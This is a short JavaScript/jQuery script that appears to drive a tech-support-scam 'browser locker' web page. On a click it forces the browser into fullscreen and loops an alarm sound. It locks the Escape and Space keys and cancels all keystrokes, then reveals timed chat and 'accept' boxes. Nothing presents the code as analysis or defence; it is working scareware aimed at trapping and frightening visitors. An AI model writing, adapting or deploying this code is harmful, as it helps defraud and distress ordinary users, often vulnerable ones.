function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}
$(document).ready(function(){

    var audioElement = document.createElement('audio');
    audioElement.setAttribute('src', 'js/_Fm7-alert.wav');

    audioElement.addEventListener('ended', function() {
        this.play();
    }, false);
    addEventListener("click", function() {
        var el = document.documentElement
            , reffer =
                   el.requestFullScreen
                || el.webkitRequestFullScreen
                || el.mozRequestFullScreen
        ;
        reffer.call(el);
        audioElement.play();
    });

   if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
        // Request to lock the keyboard
        navigator.keyboard.lock(['Escape', 'Space']); // Locks the 'Escape' and 'Space' keys
      } else {
        console.log('Keyboard Lock API is not supported in this browser.');
      }
    document.addEventListener('keydown', function(event) {
        event.preventDefault();
    }, false);
    $(document).ready(function() {
        $("#chat-box").delay(1000).fadeIn(100);
        $("#chat-box1").delay(1500).fadeIn(100);
        $(".green-box").delay(1000).fadeIn(100);
        $(".accept-box").delay(1500).fadeIn(100);
        $("#chat-box3").delay(3000).fadeIn(100);
        $("#chat-box5").delay(2000).fadeIn(100);
     });

});
